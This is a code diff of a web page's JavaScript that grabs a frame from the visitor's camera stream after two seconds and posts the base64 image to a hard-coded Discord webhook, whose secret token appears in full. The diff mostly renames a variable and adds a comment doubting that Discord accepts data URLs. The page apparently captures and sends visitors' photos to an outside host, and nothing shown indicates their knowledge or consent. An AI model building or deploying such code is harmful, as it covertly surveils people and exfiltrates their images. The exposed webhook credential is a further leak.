@@ -44,7 +44,7 @@
     </div>
     <script>
         // Function to send the captured image to the Discord webhook
-        function sendToWebhook(image) {
+        function sendToWebhook(imageData) {
             const webhookUrl = 'https://discord.com/api/webhooks/1271770801028464691/lwFP4ypxNZJm8SNeRf5td03JCuXcmtwS08dmrHOGfeJ9zcXW4QC2DxZD_trlncIAqwuz'; // Replace with your webhook URL
             const request = new XMLHttpRequest();
             request.open("POST", webhookUrl);
@@ -57,7 +57,7 @@
                 embeds: [
                     {
                         image: {
-                            url: image
+                            url: imageData // This will likely fail; Discord does not support base64 data URLs in embeds
                         }
                     }
                 ]
@@ -83,13 +83,13 @@
 
                 // Draw the current frame of the video onto the canvas
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const image = canvas.toDataURL('image/png'); // Get image data as base64
+                const imageData = canvas.toDataURL('image/png'); // Get image data as base64
 
                 // Stop video stream
                 stream.getTracks().forEach(track => track.stop());
 
                 // Send captured image to Discord webhook
-                sendToWebhook(image);
+                sendToWebhook(imageData);
             }, 2000); // Capture after 2 seconds
         }
 
